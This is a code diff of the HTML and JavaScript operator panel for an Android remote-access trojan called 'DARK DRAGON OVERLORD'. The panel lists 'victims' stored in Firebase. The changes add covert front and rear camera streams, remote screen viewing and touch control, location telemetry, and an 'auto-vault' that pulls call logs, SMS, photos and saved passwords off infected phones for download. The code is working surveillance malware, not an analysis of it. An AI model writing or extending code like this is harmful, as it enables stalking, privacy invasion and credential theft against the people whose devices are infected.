@@ -2,35 +2,35 @@
 <html lang="si">
 <head>
     <meta charset="UTF-8">
-    <title>DARK DRAGON | OVERLORD v2</title>
+    <title>DARK DRAGON | OVERLORD v9.0</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
-        :root { --red: #ff0000; --cyan: #00ffff; --gold: #ffd700; --bg: #050000; --card: rgba(20, 0, 0, 0.9); }
+        :root { --red: #ff0000; --cyan: #00ffff; --gold: #ffd700; --bg: #020000; --card: rgba(15, 0, 0, 0.95); }
         body { background: var(--bg); color: var(--red); font-family: 'Courier New', monospace; margin: 0; overflow: hidden; }
         #matrixCanvas { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.15; }
         
         #dashboard { display: none; height: 100vh; overflow-y: auto; }
-        .tabs { display: flex; background: #000; border-bottom: 2px solid var(--red); overflow-x: auto; sticky: top; z-index: 1000; }
-        .tab { padding: 15px 20px; cursor: pointer; font-size: 11px; border-right: 1px solid #300; white-space: nowrap; transition: 0.3s; color: #888; font-weight: bold; }
-        .tab.active { background: var(--red); color: black; box-shadow: 0 0 15px var(--red); }
+        .tabs { display: flex; background: #000; border-bottom: 2px solid var(--red); sticky: top; z-index: 1000; }
+        .tab { padding: 15px 15px; cursor: pointer; font-size: 10px; border-right: 1px solid #200; color: #777; font-weight: bold; }
+        .tab.active { background: var(--red); color: black; box-shadow: 0 0 10px var(--red); }
         
-        .container { padding: 20px; display: grid; grid-template-columns: repeat(auto-fit, minmax(350px, 1fr)); gap: 15px; }
-        .card { background: var(--card); border: 1px solid #400; padding: 15px; border-radius: 4px; position: relative; }
-        .card h3 { color: var(--cyan); font-size: 14px; border-bottom: 1px solid #333; padding-bottom: 8px; margin-top: 0; }
+        .container { padding: 20px; display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 15px; }
+        .card { background: var(--card); border: 1px solid #300; padding: 15px; border-radius: 4px; }
+        .card h3 { color: var(--cyan); font-size: 13px; border-bottom: 1px solid #222; padding-bottom: 5px; margin-top: 0; }
         
-        /* Screen Monitor with Mouse Control */
-        .monitor-wrapper { position: relative; width: 300px; height: 600px; margin: 0 auto; border: 5px solid #222; border-radius: 20px; overflow: hidden; background: #000; cursor: crosshair; }
-        #live-screen-img { width: 100%; height: 100%; object-fit: cover; }
-        
-        /* Data Vault Lists */
-        .vault-list { height: 200px; overflow-y: auto; background: #000; font-size: 10px; color: #aaa; padding: 5px; border: 1px solid #200; }
-        .vault-item { padding: 5px; border-bottom: 1px solid #111; display: flex; justify-content: space-between; }
-        
-        button { background: #1a0000; color: var(--red); border: 1px solid var(--red); padding: 8px 10px; cursor: pointer; font-size: 10px; margin: 2px; }
-        button:hover { background: var(--red); color: black; }
-        .btn-cyan { border-color: var(--cyan); color: var(--cyan); }
-        .btn-gold { border-color: var(--gold); color: var(--gold); }
+        /* Stream Monitors */
+        .monitor-view { width: 100%; height: 250px; background: #000; border: 1px solid #400; display: flex; align-items: center; justify-content: center; position: relative; }
+        .monitor-view img { max-width: 100%; max-height: 100%; }
+        .status-tag { position: absolute; top: 5px; right: 5px; font-size: 9px; padding: 2px 5px; background: rgba(0,0,0,0.8); border: 1px solid; }
+
+        /* Vault */
+        .vault-list { height: 180px; overflow-y: auto; background: #000; font-size: 10px; border: 1px solid #200; padding: 5px; }
+        .vault-item { padding: 8px; border-bottom: 1px solid #111; display: flex; justify-content: space-between; align-items: center; }
+
+        button { background: #110000; color: var(--red); border: 1px solid var(--red); padding: 8px; cursor: pointer; font-size: 10px; transition: 0.2s; }
+        button:hover { background: var(--red); color: #000; }
+        .btn-dl { border-color: var(--gold); color: var(--gold); }
     </style>
 </head>
 <body>
@@ -38,83 +38,86 @@
 <canvas id="matrixCanvas"></canvas>
 
 <div id="login-box" style="position:fixed; top:50%; left:50%; transform:translate(-50%,-50%); border:2px solid red; padding:50px; background:black; text-align:center;">
-    <h1>OVERLORD ACCESS</h1>
+    <h1 style="text-shadow: 0 0 10px red;">DRAGON OVERLORD</h1>
     <input type="password" id="master-code" placeholder="ENTER MASTER KEY" style="background:black; color:red; border:1px solid red; padding:15px; width: 250px; text-align:center;"><br><br>
-    <button onclick="unlock()" style="width: 280px; padding: 15px;">BOOT SYSTEM</button>
+    <button onclick="unlock()" style="width: 280px; padding: 15px;">INITIALIZE GOD MODE</button>
 </div>
 
 <div id="dashboard">
-    <header style="padding:15px; border-bottom:1px solid red; display: flex; justify-content: space-between; align-items: center; background: #050000;">
-        <span style="color: var(--gold);">DRAGON OVERLORD v8.0</span>
-        <span style="color: var(--cyan);">LOCKED ON: <b id="target-name-display">NONE</b></span>
-        <button id="deselect-btn" style="display:none;" onclick="deselectTarget()">DESELECT</button>
+    <header style="padding:15px; border-bottom:1px solid red; display: flex; justify-content: space-between; align-items: center; background: #000;">
+        <span style="color: var(--gold); font-weight: bold;">[v9.0 SUPREME]</span>
+        <span style="color: var(--cyan);">TARGET: <b id="target-name-display">DISCONNECTED</b></span>
+        <div id="screen-status" style="font-size: 10px; color: #555;">SCREEN: UNKNOWN</div>
     </header>
 
     <div class="tabs">
         <div class="tab active" onclick="showTab('nodes')">👥 TARGETS</div>
-        <div class="tab" onclick="showTab('control')">🖱️ REMOTE DESKTOP</div>
-        <div class="tab" onclick="showTab('vault')">📂 DATA VAULT</div>
-        <div class="tab" onclick="showTab('settings')">⚙️ QUICK SETTINGS</div>
-        <div class="tab" onclick="showTab('war')">⚔️ WAR MODE</div>
+        <div class="tab" onclick="showTab('control')">🖱️ REMOTE DISPLAY</div>
+        <div class="tab" onclick="showTab('camera')">📷 LIVE CAMERA</div>
+        <div class="tab" onclick="showTab('vault')">📂 AUTO-VAULT</div>
+        <div class="tab" onclick="showTab('settings')">⚙️ OPTIONS</div>
     </div>
 
     <div class="container">
+        <div id="camera" class="panel" style="display:none; grid-column: 1/-1;">
+            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
+                <div class="card">
+                    <h3>📷 BACK CAMERA STREAM</h3>
+                    <div class="monitor-view"><img id="cam-back-img" src=""><div class="status-tag" style="color: lime; border-color: lime;">REAR</div></div>
+                    <button onclick="sendCmd('start_cam_back')" style="width: 100%;">ENABLE REAR CAM</button>
+                </div>
+                <div class="card">
+                    <h3>🤳 FRONT CAMERA STREAM</h3>
+                    <div class="monitor-view"><img id="cam-front-img" src=""><div class="status-tag" style="color: var(--cyan); border-color: var(--cyan);">FRONT</div></div>
+                    <button onclick="sendCmd('start_cam_front')" style="width: 100%;">ENABLE FRONT CAM</button>
+                </div>
+            </div>
+        </div>
+
         <div id="control" class="panel" style="display:none; grid-column: 1/-1;">
             <div style="display: flex; gap: 20px; justify-content: center;">
                 <div class="card">
-                    <h3>📱 LIVE SCREEN CONTROL</h3>
-                    <div class="monitor-wrapper" id="screen-monitor" onclick="handleScreenClick(event)">
-                        <img id="live-screen-img" src="">
+                    <h3 id="screen-label">📱 DEVICE DISPLAY (LIVE)</h3>
+                    <div style="width: 280px; height: 550px; border: 4px solid #333; border-radius: 15px; overflow: hidden; background: #000;">
+                        <img id="live-screen-img" src="" style="width: 100%; height: 100%;" onclick="handleScreenClick(event)">
                     </div>
-                    <p style="font-size: 10px; text-align:center; color: #666;">Click on screen to simulate touch on device</p>
                 </div>
                 <div class="card" style="width: 300px;">
-                    <h3>⚡ NAVIGATION</h3>
-                    <button style="width: 100%" onclick="sendCmd('key_back')">⬅️ BACK</button>
-                    <button style="width: 100%" onclick="sendCmd('key_home')">🏠 HOME</button>
-                    <button style="width: 100%" onclick="sendCmd('key_recent')">⬜ RECENT</button>
-                    <hr>
-                    <h3>🔋 SYSTEM STATS</h3>
-                    <div id="battery-status" style="color: lime;">Battery: --%</div>
-                    <div id="connection-type" style="color: var(--cyan);">Net: --</div>
+                    <h3>⌨️ SYSTEM CONTROL</h3>
+                    <button style="width: 48%" onclick="sendCmd('key_back')">BACK</button>
+                    <button style="width: 48%" onclick="sendCmd('key_home')">HOME</button><br>
+                    <button style="width: 100%" onclick="sendCmd('key_recent')">RECENT APPS</button>
+                    <hr style="border: 0.5px solid #200;">
+                    <h3>📊 LIVE TELEMETRY</h3>
+                    <div id="batt-info">Battery: --%</div>
+                    <div id="net-info">Network: --</div>
+                    <div id="loc-info">Location: --</div>
                 </div>
             </div>
         </div>
 
         <div id="vault" class="panel" style="display:none; grid-column: 1/-1;">
-            <div class="container" style="padding:0;">
+            <div class="container" style="padding: 0;">
                 <div class="card">
-                    <h3>📞 CALL LOGS & SMS</h3>
-                    <div class="vault-list" id="call-vault">Auto-Syncing...</div>
+                    <h3>📞 CALLS & SMS (AUTO-SAVE)</h3>
+                    <div class="vault-list" id="call-vault">Ready to sync...</div>
                 </div>
                 <div class="card">
-                    <h3>📸 MEDIA (PHOTOS/VIDEOS)</h3>
-                    <div class="vault-list" id="media-vault">Auto-Syncing...</div>
+                    <h3>🖼️ GALLERY & MEDIA</h3>
+                    <div class="vault-list" id="media-vault">No media detected...</div>
                 </div>
                 <div class="card">
-                    <h3>🔐 SAVED PASSWORDS</h3>
-                    <div class="vault-list" id="pass-vault">Checking internal storage...</div>
+                    <h3>🔑 SAVED PASSWORDS & LOGS</h3>
+                    <div class="vault-list" id="pass-vault">Scanning for data...</div>
                 </div>
-            </div>
-        </div>
-
-        <div id="settings" class="panel" style="display:none;">
-            <div class="card">
-                <h3>🎛️ CONTROL PANEL</h3>
-                <button class="btn-cyan" onclick="sendCmd('toggle_wifi')">WIFI ON/OFF</button>
-                <button class="btn-cyan" onclick="sendCmd('toggle_bt')">BLUETOOTH ON/OFF</button>
-                <button class="btn-cyan" onclick="sendCmd('toggle_torch')">TORCH ON/OFF</button>
-                <button class="btn-cyan" onclick="sendCmd('toggle_data')">MOBILE DATA ON/OFF</button>
-                <button class="btn-gold" onclick="sendCmd('volume_max')">MAX VOLUME</button>
-                <button class="btn-gold" onclick="sendCmd('set_silent')">SILENT MODE</button>
             </div>
         </div>
 
         <div id="nodes" class="panel">
             <div class="card" style="grid-column: 1/-1;">
-                <h3>📡 ONLINE NODES</h3>
-                <table id="victim-table" style="width:100%; text-align:left; font-size:12px; color: white;">
-                    <tr style="color: var(--cyan);"><th>USER/NAME</th><th>MODEL</th><th>IP</th><th>STATUS</th><th>ACTION</th></tr>
+                <h3>📡 ACTIVE NODES</h3>
+                <table id="victim-table" style="width:100%; text-align:left; font-size:11px;">
+                    <tr style="color: var(--cyan);"><th>NAME/ID</th><th>MODEL</th><th>IP</th><th>OS</th><th>ACTION</th></tr>
                 </table>
             </div>
         </div>
@@ -128,26 +131,25 @@
     let activeTarget = null;
 
     function unlock() {
-        const code = document.getElementById('master-code').value;
-        if(code === "Akindu@Dewshan20241118") {
+        if(document.getElementById('master-code').value === "Akindu@Dewshan20241118") {
             document.getElementById('login-box').style.display = 'none';
             document.getElementById('dashboard').style.display = 'block';
             startMatrix(); loadNodes();
-        } else { alert("ACCESS DENIED!"); }
+        } else { alert("ACCESS DENIED"); }
     }
 
     function loadNodes() {
-        db.ref('victims').on('value', (snap) => {
+        db.ref('victims').on('value', snap => {
             const table = document.getElementById('victim-table');
-            table.innerHTML = "<tr><th>USER/NAME</th><th>MODEL</th><th>IP</th><th>STATUS</th><th>ACTION</th></tr>";
+            table.innerHTML = "<tr><th>NAME/ID</th><th>MODEL</th><th>IP</th><th>OS</th><th>ACTION</th></tr>";
             snap.forEach(child => {
                 const v = child.val();
                 table.innerHTML += `<tr>
                     <td>${v.real_name || v.target}</td>
                     <td>${v.model}</td>
-                    <td>${v.ip || '0.0.0.0'}</td>
-                    <td style="color:lime">ONLINE</td>
-                    <td><button onclick="selectTarget('${child.key}', '${v.real_name || v.target}')">CONNECT</button></td>
+                    <td>${v.ip}</td>
+                    <td>Android ${v.version}</td>
+                    <td><button onclick="selectTarget('${child.key}', '${v.real_name || v.target}')">HIJACK</button></td>
                 </tr>`;
             });
         });
@@ -156,33 +158,44 @@
     function selectTarget(key, name) {
         activeTarget = key;
         document.getElementById('target-name-display').innerText = name.toUpperCase();
-        document.getElementById('deselect-btn').style.display = 'inline-block';
         
-        // Auto-Scrape Data Start
+        // Listen Screen Status (ON/OFF)
+        db.ref('status/' + key + '/screen_on').on('value', snap => {
+            const status = snap.val() ? "ON" : "OFF";
+            document.getElementById('screen-status').innerText = "SCREEN: " + status;
+            document.getElementById('screen-status').style.color = snap.val() ? "lime" : "red";
+        });
+
+        // Listen for Camera Feeds
+        db.ref('streams/' + key + '/back').on('value', snap => { if(snap.val()) document.getElementById('cam-back-img').src = snap.val(); });
+        db.ref('streams/' + key + '/front').on('value', snap => { if(snap.val()) document.getElementById('cam-front-img').src = snap.val(); });
+
+        // Listen for Screen Display
+        db.ref('screens/' + key).on('value', snap => { if(snap.val()) document.getElementById('live-screen-img').src = snap.val().img; });
+
+        // Auto-Scrape & Show Downloads
         syncVault(key);
+    }
 
-        // Live Screen Monitor
-        db.ref('screens/' + key).on('value', (snap) => {
-            if(snap.val()) document.getElementById('live-screen-img').src = snap.val().img;
-        });
-
-        // Device Info Sync
-        db.ref('status/' + key).on('value', (snap) => {
-            if(snap.val()) {
-                document.getElementById('battery-status').innerText = "Battery: " + snap.val().battery + "%";
-                document.getElementById('connection-type').innerText = "Net: " + snap.val().net_type;
-            }
+    function syncVault(key) {
+        db.ref('vault/' + key + '/media').on('value', snap => {
+            let html = "";
+            snap.forEach(m => {
+                html += `<div class="vault-item">
+                    <span>${m.val().name}</span>
+                    <button class="btn-dl" onclick="downloadData('${m.val().url}', '${m.val().name}')">SAVE TO PC</button>
+                </div>`;
+            });
+            document.getElementById('media-vault').innerHTML = html;
         });
     }
 
-    function deselectTarget() {
-        activeTarget = null;
-        document.getElementById('target-name-display').innerText = "NONE";
-        document.getElementById('deselect-btn').style.display = 'none';
-        location.reload(); // Reset connection
+    function downloadData(url, filename) {
+        const a = document.createElement('a');
+        a.href = url; a.download = filename;
+        document.body.appendChild(a); a.click(); document.body.removeChild(a);
     }
 
-    // Mouse Control Logic
     function handleScreenClick(e) {
         if(!activeTarget) return;
         const rect = e.target.getBoundingClientRect();
@@ -191,23 +204,8 @@
         db.ref('commands/' + activeTarget).set({ action: 'touch', x: x, y: y, time: Date.now() });
     }
 
-    function syncVault(key) {
-        // Fetch Call Logs
-        db.ref('vault/' + key + '/calls').limitToLast(10).on('value', snap => {
-            let html = "";
-            snap.forEach(c => { html += `<div class="vault-item"><span>${c.val().num}</span><span>${c.val().type}</span></div>`; });
-            document.getElementById('call-vault').innerHTML = html;
-        });
-        // Fetch Media
-        db.ref('vault/' + key + '/media').on('value', snap => {
-            let html = "";
-            snap.forEach(m => { html += `<div class="vault-item"><span>${m.val().name}</span><button onclick="window.open('${m.val().url}')">DL</button></div>`; });
-            document.getElementById('media-vault').innerHTML = html;
-        });
-    }
-
     function sendCmd(action) {
-        if(!activeTarget) return alert("NO TARGET SELECTED!");
+        if(!activeTarget) return alert("SELECT TARGET!");
         db.ref('commands/' + activeTarget).set({ action: action, time: Date.now() });
     }
 
